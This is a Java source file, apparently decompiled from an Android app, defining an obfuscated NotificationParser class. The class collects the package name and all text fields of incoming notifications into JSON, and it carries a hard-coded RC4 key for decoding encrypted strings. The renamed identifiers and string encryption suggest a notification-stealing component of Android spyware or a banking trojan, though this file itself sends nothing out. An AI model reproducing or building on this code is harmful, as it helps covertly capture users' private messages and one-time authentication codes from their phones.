package com.example.mmm.Utils;

import android.annotation.TargetApi;
import android.app.Notification;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import org.json.JSONObject;

final class NotificationParser {
   constants linked$ = new constants();
   utils keeping$ = new utils();
   private final boolean blowing$;
   private Notification reform$;
   private String seemed$;
   private String marathon$;
   private String reveals$;
   private String picking$;
   private String guest$;
   private String reuters$;
   private String casinos$;
   private String surgical$;
   private String permits$;
   private String mills$;

   @TargetApi(19)
   @TargetApi(19)
   NotificationParser(StatusBarNotification var1, boolean var2) {
      this.blowing$ = var2;
      this.reform$ = var1.getNotification();
      this.seemed$ = var1.getPackageName();
      Bundle var5 = var1.getNotification().extras;
      if (var2) {
         this.marathon$ = _alice(this.reform$.tickerText);
         if (var5 != null) {
            var1.getNotification();
            this.reveals$ = _alice(var5.getCharSequence("android.title"));
            var1.getNotification();
            this.picking$ = _alice(var5.getCharSequence("android.title.big"));
            var1.getNotification();
            this.guest$ = _alice(var5.getCharSequence("android.text"));
            var1.getNotification();
            this.reuters$ = _alice(var5.getCharSequence("android.bigText"));
            var1.getNotification();
            this.casinos$ = _alice(var5.getCharSequence("android.infoText"));
            var1.getNotification();
            this.surgical$ = _alice(var5.getCharSequence("android.subText"));
            var1.getNotification();
            this.permits$ = _alice(var5.getCharSequence("android.summaryText"));
            var1.getNotification();
            CharSequence[] var8 = var5.getCharSequenceArray("android.textLines");
            if (var8 != null) {
               this.mills$ = "";
               int var4 = var8.length;

               for(int var3 = 0; var3 < var4; ++var3) {
                  CharSequence var7 = var8[var3];
                  StringBuilder var6 = new StringBuilder();
                  var6.append(this.mills$);
                  var6.append(var7);
                  var6.append("\n");
                  this.mills$ = var6.toString();
               }

               this.mills$ = this.mills$.trim();
            }

         }
      }
   }

   private static String _alice(CharSequence var0) {
      return var0 == null ? "" : var0.toString();
   }

   private String _knights(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public final String toString() {
      JSONObject var1 = new JSONObject();
      var1.put("packageName", this.seemed$);
      if (this.blowing$) {
         var1.put("tickerText", this.marathon$);
         var1.put("title", this.reveals$);
         var1.put("titleBig", this.picking$);
         var1.put("text", this.guest$);
         var1.put("textBig", this.reuters$);
         var1.put("textInfo", this.casinos$);
         var1.put("textSub", this.surgical$);
         var1.put("textSummary", this.permits$);
         var1.put("textLines", this.mills$);
         return var1.toString();
      } else {
         return "";
      }
   }
}
